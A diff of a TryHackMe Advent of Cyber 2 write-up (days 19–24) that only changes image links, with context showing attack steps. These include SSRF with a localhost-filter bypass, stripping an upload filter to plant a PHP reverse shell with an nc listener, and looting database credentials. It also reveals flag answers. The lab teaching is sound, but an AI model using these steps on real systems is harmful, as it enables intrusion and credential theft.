@@ -1280,7 +1280,7 @@ In this task we will be using Server Side Request Forgery or SSRF to get informa
 
    After navigating to the website and enter a name we take note of the URL. After decoding it through CyberChef we get a clearer idea.
    
-   ![URL Decoded](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2019/List_URL_Decode.png)
+   ![URL Decoded](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2019/List_URL_Decode.png)
    
    Looks like a re-direct to a local machine, since .hohoho isn't a valid top-level domain. We could try connecting to the root directory by navigating to the following URL (make sure to properly encode the URL):
    
@@ -1288,7 +1288,7 @@ In this task we will be using Server Side Request Forgery or SSRF to get informa
    http://10.10.44.100/?proxy=http://list.hohoho:8080/
    ```
    
-   ![Modified URL](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2019/List_Modified_URL.png)
+   ![Modified URL](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2019/List_Modified_URL.png)
    
    This looks promising as the request was indeed made and a response was returned. Lets try a different port. 80 for the default http traffic.
    
@@ -1296,7 +1296,7 @@ In this task we will be using Server Side Request Forgery or SSRF to get informa
    http://10.10.44.100/?proxy=http://list.hohoho:80/
    ```
    
-   ![Connect 80](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2019/List_80_Refused.png)
+   ![Connect 80](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2019/List_80_Refused.png)
    
    Seems like port 80 is not open for use.
    
@@ -1306,7 +1306,7 @@ In this task we will be using Server Side Request Forgery or SSRF to get informa
    http://10.10.44.100/?proxy=http://list.hohoho:22/
    ```
    
-   ![Connect 22](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2019/List_22_Reset.png)
+   ![Connect 22](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2019/List_22_Reset.png)
    
    The message does suggest the port is open, but did not understand the request. Lets now try connecting to the machine itself through `localhost`.
    
@@ -1314,7 +1314,7 @@ In this task we will be using Server Side Request Forgery or SSRF to get informa
    http://10.10.44.100/?proxy=http://localhost/
    ```
    
-   ![Localhost](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2019/List_Local.png)
+   ![Localhost](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2019/List_Local.png)
    
    Seems like the domain is blocked. The same happens with 127.0.0.1. We will try to bypass it with `localtest.me`. This domain resolves all requests to 127.0.0.1.
    
@@ -1322,7 +1322,7 @@ In this task we will be using Server Side Request Forgery or SSRF to get informa
    http://10.10.44.100/?proxy=http://list.hohoho.localtest.me/
    ```
    
-   ![Localhost](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2019/List_Localhost.png)
+   ![Localhost](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2019/List_Localhost.png)
    
    Looks like we found our password.
 
@@ -1332,11 +1332,11 @@ In this task we will be using Server Side Request Forgery or SSRF to get informa
 
    Now we can login into the admin panel. Make sure you are using the original URL.
    
-   ![Delete List](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2019/List_Delete.png)
+   ![Delete List](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2019/List_Delete.png)
    
    After deleting the list, we get our flag.
    
-   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2019/List_Flag.png)
+   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2019/List_Flag.png)
 
    ><details><summary>Click for answer</summary>THM{EVERYONE_GETS_PRESENTS}</details>
 
@@ -1362,7 +1362,7 @@ ssh mceager@10.10.202.160
    Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue
    ```
    
-   ![Get File](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2020/Powershell_Get_File.png)
+   ![Get File](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2020/Powershell_Get_File.png)
    
    Now we must get the contents of this file we just found.
    
@@ -1370,7 +1370,7 @@ ssh mceager@10.10.202.160
    Get-Content -Path e1fone.txt
    ```
    
-   ![Hidden File](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2020/Powershell_Hidden_File.png)
+   ![Hidden File](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2020/Powershell_Hidden_File.png)
 
    ><details><summary>Click for answer</summary>2 front teeth</details>
 
@@ -1382,11 +1382,11 @@ ssh mceager@10.10.202.160
    Get-ChildItem -Directory -Hidden -ErrorAction SilentlyContinue
    ```
    
-   ![Directory](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2020/Powershell_Directory.png)
+   ![Directory](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2020/Powershell_Directory.png)
    
    After navigating into this folder we can look for any files and view their contents.
    
-   ![Second File](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2020/Powershell_Second_File.png)
+   ![Second File](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2020/Powershell_Second_File.png)
 
    ><details><summary>Click for answer</summary>Scrooged</details>
 
@@ -1398,7 +1398,7 @@ ssh mceager@10.10.202.160
    Get-ChildItem -Directory -Hidden -Filter '*3*' -Recurse -ErrorAction SilentlyContinue
    ```
    
-   ![Third Folder](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2020/Powershell_Third_Folder.png)
+   ![Third Folder](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2020/Powershell_Third_Folder.png)
 
    ><details><summary>Click for answer</summary>3lfthr3e</details>
 
@@ -1410,7 +1410,7 @@ ssh mceager@10.10.202.160
    Get-ChildItem -Hidden -ErrorAction SilentlyContinue
    ```
    
-   ![Hidden Files](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2020/Powershell_Third_Hidden_Files.png)
+   ![Hidden Files](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2020/Powershell_Third_Hidden_Files.png)
    
    Now we can get the number of words in the first file with:
    
@@ -1428,7 +1428,7 @@ ssh mceager@10.10.202.160
    (Get-Content -Path 1.txt)[551]
    ```
    
-   ![Words](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2020/Powershell_Words.png)
+   ![Words](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2020/Powershell_Words.png)
 
    ><details><summary>Click for answer</summary>Red Ryder</details>
 
@@ -1440,7 +1440,7 @@ ssh mceager@10.10.202.160
    Select-String -Path 2.txt -Pattern 'RedRyder'
    ```
    
-   ![Last Word](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2020/Powershell_Last_Word.png)
+   ![Last Word](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2020/Powershell_Last_Word.png)
 
    ><details><summary>Click for answer</summary>Red Ryder bb gun</details>
 
@@ -1455,7 +1455,7 @@ In this task we will be using PowerShell to get more information about an execut
 
    For this question we simply navigate to the Documents folder and open the text file.
    
-   ![File Hash](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2021/Forensics_Hash.png)
+   ![File Hash](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2021/Forensics_Hash.png)
 
    ><details><summary>Click for answer</summary>596690FFC54AB6101932856E6A78E3A1</details>
 
@@ -1467,7 +1467,7 @@ In this task we will be using PowerShell to get more information about an execut
    Get-FileHash -Algorithm MD5 "C:\Users\littlehelper\Documents\deebee.exe"
    ```
    
-   ![Hash Found](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2021/Forensics_Hash_Found.png)
+   ![Hash Found](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2021/Forensics_Hash_Found.png)
 
    ><details><summary>Click for answer</summary>5F037501FB542AD2D9B06EB12AED09F0</details>
 
@@ -1479,7 +1479,7 @@ In this task we will be using PowerShell to get more information about an execut
    C:\Tools\strings564.exe -accepteula "C:\Users\littlehelper\Documents\deebee.exe"
    ```
    
-   ![Strings](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2021/Forensics_Strings.png)
+   ![Strings](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2021/Forensics_Strings.png)
    
    As you can see, this gives a lot of results. We can simply scroll through the results or we can pipe the results to `findstr` to look for any strings that could be the flag.
    
@@ -1487,7 +1487,7 @@ In this task we will be using PowerShell to get more information about an execut
    C:\Tools\strings564.exe -accepteula "C:\Users\littlehelper\Documents\deebee.exe" \ findstr /i THM
    ```
    
-   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2021/Forensics_Flag1.png)
+   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2021/Forensics_Flag1.png)
 
    ><details><summary>Click for answer</summary>THM{f6187e6cbeb1214139ef313e108cb6f9}</details>
 
@@ -1495,7 +1495,7 @@ In this task we will be using PowerShell to get more information about an execut
 
    From the strings results we can see a command related to ADS (due to the `-stream` argument).
    
-   ![Database Stream](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2021/Forensics_Database_Stream.png)
+   ![Database Stream](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2021/Forensics_Database_Stream.png)
    
    We can use powershell to find datastreams in a binary.
    
@@ -1503,7 +1503,7 @@ In this task we will be using PowerShell to get more information about an execut
    Get-Item -Path "C:\Users\littlehelper\Documents\deebee.exe" -Stream *
    ```
    
-   ![Streams](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2021/Forensics_Streams.png)
+   ![Streams](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2021/Forensics_Streams.png)
    
    Looks like there is a second datastream called `hidedb`.
    
@@ -1513,15 +1513,15 @@ In this task we will be using PowerShell to get more information about an execut
    wmi process call create $(Resolve-Path C:\Users\littlehelper\Documents\deebee.exe:hidedb)
    ```
    
-   ![Execute Stream](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2021/Forensics_Execute_Stream.png)
+   ![Execute Stream](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2021/Forensics_Execute_Stream.png)
    
    This executes the file and gives us another window.
    
-   ![Loading Screen](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2021/Forensics_Loading.png)
+   ![Loading Screen](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2021/Forensics_Loading.png)
    
    After the program has loaded, we can see the flag.
    
-   ![Menu Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2021/Forensics_Menu.png)
+   ![Menu Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2021/Forensics_Menu.png)
 
    ><details><summary>Click for answer</summary>THM{3088731ddc7b9fdeccaed982b07c297c}</details>
 
@@ -1537,21 +1537,21 @@ In this task we must try to decode several passwords for the Keepass database us
 
    In the Windows machine we find a folder containing the database.
    
-   ![Folder](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2022/Cyberelf_Folder.png)
+   ![Folder](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2022/Cyberelf_Folder.png)
    
    Filling in the supplied masterkey we get an error message.
    
-   ![Old Key](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2022/Cyberelf_Old_Key.png)
+   ![Old Key](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2022/Cyberelf_Old_Key.png)
    
-   ![Wrong Key](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2022/Cyberelf_Wrong_Key.png)
+   ![Wrong Key](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2022/Cyberelf_Wrong_Key.png)
    
    The folder name looks a little cryptic. Maybe it has a clue for the password. Looking at the name, it looks like a Base64 encoding. Lets open up CyberChef and copy the string. CyberChef will automatically suggest an encoding if it finds a match (even without using the magic recipe). This is indeed Base64 encoded. 
    
-   ![Decode](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2022/Cyberelf_Decode.png)
+   ![Decode](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2022/Cyberelf_Decode.png)
    
    Fortunately, we can indeed log in with this password.
    
-   ![New Key](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2022/Cyberelf_New_Key.png)
+   ![New Key](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2022/Cyberelf_New_Key.png)
 
    ><details><summary>Click for answer</summary>thegrinchwashere</details>
 
@@ -1565,11 +1565,11 @@ In this task we must try to decode several passwords for the Keepass database us
 
    If we open the password entry we can see a weird string as password (which probably is not correct) and a note. Judging from the string format it looks like hexadecimal encoding. The note does indeed hint in the direction of Hex encoding.
    
-   ![Elf Server](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2022/Cyberelf_Elf_Server.png)
+   ![Elf Server](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2022/Cyberelf_Elf_Server.png)
    
    We can copy the string into CyberChef and it will also suggest Hex encoding. This yields us the correct password for the server.
    
-   ![Elf Server Decoded](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2022/Cyberelf_Elf_Server_Decode.png)
+   ![Elf Server Decoded](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2022/Cyberelf_Elf_Server_Decode.png)
 
    ><details><summary>Click for answer</summary>sn0wM4n!</details>
 
@@ -1577,11 +1577,11 @@ In this task we must try to decode several passwords for the Keepass database us
 
    Opening the mail password entry, we get a hint of `entities`. The string doesn't ring a bell yet. 
    
-   ![Elf Email](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2022/Cyberelf_Elf_Mail.png)
+   ![Elf Email](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2022/Cyberelf_Elf_Mail.png)
    
    We can put the string into CyberChef and search for `entities`. This will result in `HTML Entinty`. However, CyberChef already suggested this encoding method after pasting the string.
    
-   ![Elf Mail Decoded](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2022/Cyberelf_Elf_Mail_Decode.png)
+   ![Elf Mail Decoded](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2022/Cyberelf_Elf_Mail_Decode.png)
 
    ><details><summary>Click for answer</summary>ic3Skating!</details>
 
@@ -1589,19 +1589,19 @@ In this task we must try to decode several passwords for the Keepass database us
 
    For the security system, we probably have to use the note as our password.
    
-   ![Elf Security](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2022/Cyberelf_Elf_Security.png)
+   ![Elf Security](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2022/Cyberelf_Elf_Security.png)
    
    Looks like it is a Charcode encoding. After adding the recipe in CyberChef, we don't have a result yet. I tried several things, but then consulted the documentation for this encoding. We can try different separators and base numbers until we get something coherent. Base 10 seems to be what we are looking for.
    
-   ![Elf Security Pre Decoded](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2022/Cyberelf_Elf_Security_Pre_Decode.png)
+   ![Elf Security Pre Decoded](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2022/Cyberelf_Elf_Security_Pre_Decode.png)
    
    Since this is not a valid password yet, we can try adding the decode step a second time.
    
-   ![Elf Security Decoded](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2022/Cyberelf_Elf_Security_Decode.png)
+   ![Elf Security Decoded](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2022/Cyberelf_Elf_Security_Decode.png)
    
    Looks like we are given a Github page which will contain a flag. Unfortunately, the page has since been removed from Github..
    
-   ![Gist](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2022/Cyberelf_Gist.png)
+   ![Gist](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2022/Cyberelf_Gist.png)
    
    Luckily, I managed to find the flag through some searching on Google.
 
@@ -1623,11 +1623,11 @@ In this task we will be using a Windows feature called Volume Shadow Copy Servic
 
 1. Decrypt the fake 'bitcoin address' within the ransom note. What is the plain text value?
 
-   ![Encoded Message](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2023/Grinch_Message.png)
+   ![Encoded Message](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2023/Grinch_Message.png)
    
    On the desktop we can find a ransom note with a bitcoin address. This does, however, look awfully like a base64 encoded string. Lets use CyberChef to find out.
    
-   ![Decoded Message](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2023/Grinch_Message_Decoded.png)
+   ![Decoded Message](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2023/Grinch_Message_Decoded.png)
 
    ><details><summary>Click for answer</summary>nomorebestfestivalcompany</details>
 
@@ -1635,7 +1635,7 @@ In this task we will be using a Windows feature called Volume Shadow Copy Servic
 
    Navigating into the Documents folder we can see the extension of the encrypted files.
    
-   ![File Extension](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2023/Grinch_File_Extension.png)
+   ![File Extension](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2023/Grinch_File_Extension.png)
 
    ><details><summary>Click for answer</summary>.grinch</details>
 
@@ -1643,7 +1643,7 @@ In this task we will be using a Windows feature called Volume Shadow Copy Servic
 
    In the scheduled task window we can see several task. One of which seems suspicious.
    
-   ![Scheduled Task](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2023/Grinch_Scheduled_Task.png)
+   ![Scheduled Task](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2023/Grinch_Scheduled_Task.png)
 
    ><details><summary>Click for answer</summary>opidsfsdf</details>
 
@@ -1651,7 +1651,7 @@ In this task we will be using a Windows feature called Volume Shadow Copy Servic
 
    Clicking on the 'Actions' tab for the task gives us information of what happens when the task is triggered.
    
-   ![File Location](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2023/Grinch_File_Location.png)
+   ![File Location](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2023/Grinch_File_Location.png)
 
    ><details><summary>Click for answer</summary>C:\Users\Administrator\Desktop\opidsfsdf.exe</details>
 
@@ -1659,11 +1659,11 @@ In this task we will be using a Windows feature called Volume Shadow Copy Servic
 
    If we look at the task for the VSS service, we can find the Volume ID in the Name field.
    
-   ![Shadow Task](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2023/Grinch_Shadow_Task.png)
+   ![Shadow Task](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2023/Grinch_Shadow_Task.png)
    
    This is identical to the ID listed by `vssadmin`.
    
-   ![VSS Volumes](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2023/Grinch_VSS_Volumes.png)
+   ![VSS Volumes](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2023/Grinch_VSS_Volumes.png)
 
    ><details><summary>Click for answer</summary>7a9eea15-0000-0000-0000-01000000000</details>
 
@@ -1671,15 +1671,15 @@ In this task we will be using a Windows feature called Volume Shadow Copy Servic
 
    To make the hidden drive, we must assign it a letter. This can be done by right clicking the partition and clicking 'Change Drive Letter'.
    
-   ![Assign Letter](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2023/Grinch_Assign_Letter.png)
+   ![Assign Letter](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2023/Grinch_Assign_Letter.png)
    
    Now we can select a letter which isn't is use yet.
    
-   ![Drive Letter](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2023/Grinch_Drive_Letter.png)
+   ![Drive Letter](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2023/Grinch_Drive_Letter.png)
    
    Inside this folder we can check the box to show hidden items. 
    
-   ![Hidden Folder](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2023/Grinch_Hidden_Folder.png)
+   ![Hidden Folder](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2023/Grinch_Hidden_Folder.png)
 
    ><details><summary>Click for answer</summary>confidential</details>
 
@@ -1687,7 +1687,7 @@ In this task we will be using a Windows feature called Volume Shadow Copy Servic
 
    Restoring the encrypted (or the file in the hidden drive) to a previous version did not work for some reason. However, it was possible to simply open the file from the hidden drive to view the password.
    
-   ![Password Decoded](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2023/Grinch_Password_Decoded.png)
+   ![Password Decoded](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2023/Grinch_Password_Decoded.png)
 
    ><details><summary>Click for answer</summary>m33pa55w0rdIZseecure!</details>
 
@@ -1703,7 +1703,7 @@ In this final task we will be combining the knowledge of previous days to get ac
    nmap -sV 10.10.12.231
    ```
    
-   ![Nmap Result](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2024/Trail_Nmap.png)
+   ![Nmap Result](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Nmap.png)
 
    ><details><summary>Click for answer</summary>80, 65000</details>
 
@@ -1711,7 +1711,7 @@ In this final task we will be combining the knowledge of previous days to get ac
 
    When we go the webserver in our browser we see a TryHackMe page. However, looking at the nmap results, we can see there is a second server serving content on port 65000. Navigating to this page directly we get a login page.
    
-   ![Register Site](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2024/Trail_Register.png)
+   ![Register Site](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Register.png)
   
    ><details><summary>Click for answer</summary>Light Cycle</details>
 
@@ -1724,7 +1724,7 @@ In this final task we will be combining the knowledge of previous days to get ac
    
    Unfortunately, they probably knew we would try this... Nice..
    
-   ![Nice](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2024/Trail_Nice.png)
+   ![Nice](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Nice.png)
    
    Lets continue out search with `dirsearch`. Using Dirsearch we can find some hidden directories on the webserver. However, it didn't seem to find any hidden pages.
    
@@ -1732,13 +1732,13 @@ In this final task we will be combining the knowledge of previous days to get ac
    dirsearch -u http://10.10.12.231:65000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -e php
    ```
    
-   ![Dir Search Results](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2024/Trail_Dir_Search.png)
+   ![Dir Search Results](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Dir_Search.png)
    
    So I tried using `dirb`, which did yield a result.
    
-   ![Dirb Results](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2024/Trail_Dirb_Results.png)
+   ![Dirb Results](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Dirb_Results.png)
    
-   ![Upload Page](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2024/Trail_Uploads.png)
+   ![Upload Page](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Uploads.png)
 
    ><details><summary>Click for answer</summary>uploads.php</details>
 
@@ -1754,27 +1754,27 @@ Bypass the filters. Upload and execute a reverse shell.
 
    In order to get a reverse shell on this machine we should upload a file to it. Unfortunately, it seems not only php files are filtered. Any image file is filtered.
    
-   ![Invalid Type](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2024/Trail_Invalid_Type.png)
+   ![Invalid Type](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Invalid_Type.png)
    
    We need to get rid of the javascript responsible for the filtering. To do this we can use Burpsuite. First we must make some changes to the settings. Remove `^js$|` from the setting.
    
-   ![Requests](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2024/Trail_Burp_Requests.png)
+   ![Requests](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Burp_Requests.png)
    
    Then make sure the next checkbox is checked.
    
-   ![Responses](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2024/Trail_Burp_Responses.png)
+   ![Responses](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Burp_Responses.png)
    
    Now reload the upload page with proxyfoxy turned on. Now we must remove the javescript filter from the response to bypass the filetype filtering.
    
-   ![Response Edit](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2024/Trail_Response.png)
+   ![Response Edit](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Response.png)
    
    Now forward the response to the browser and prepare the payload for upload. First copy the php reverse shell and edit it to contain our attack machine ip and a specified port number.
    
-   ![Shell Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2024/Trail_Reverse_Shell_Script.png)
+   ![Shell Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Reverse_Shell_Script.png)
    
    Next we change the extension to `png.php` and upload the file to the server.
    
-   ![Upload Success](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2024/Trail_Upload_Success.png)
+   ![Upload Success](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Upload_Success.png)
    
    Now navigate to the upload folder and execute the script **after** setting up a listener on the specified port.
    
@@ -1782,7 +1782,7 @@ Bypass the filters. Upload and execute a reverse shell.
    nc -nlvp 1337
    ```
    
-   ![Listener](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2024/Trail_Listener.png)
+   ![Listener](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Listener.png)
    
    Now that we have a shell we can look for the file and reveal its contents.
    
@@ -1790,7 +1790,7 @@ Bypass the filters. Upload and execute a reverse shell.
    find -name "web.txt" 2>/dev/null
    ```
    
-   ![Web Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2024/Trail_Flag_Web.png)
+   ![Web Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Flag_Web.png)
 
    ><details><summary>Click for answer</summary>THM{ENTER_THE_GRID}</details>
 
@@ -1808,13 +1808,13 @@ Ctrl + Z
 stty raw -echo; fg
 ```
 
-![Stabalize Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2024/Trail_Stabalize_Shell.png)
+![Stabalize Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Stabalize_Shell.png)
 
 6. Review the configuration files for the webserver to find some useful loot in the form of credentials. What credentials do you find? username:password
 
    For this step we can use our newly created shell to go through the files in the `/www/` folder. One folder in particular is of interest to us. dbauth.php.
    
-   ![DB Credentials](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2024/Trail_DB_Authentication_Creds.png)
+   ![DB Credentials](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_DB_Authentication_Creds.png)
    
    Looks like there are some credentials present in this file we can use to get access to the database.
 
@@ -1828,11 +1828,11 @@ stty raw -echo; fg
    mysql -utron -p
    ```
    
-   ![Login Database](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2024/Trail_Login_Database.png)
+   ![Login Database](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Login_Database.png)
    
    First we must enumerate the database to find any interesting tables/entries. `show databases` is our first step.
    
-   ![Show Databases](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2024/Trail_Databases.png)
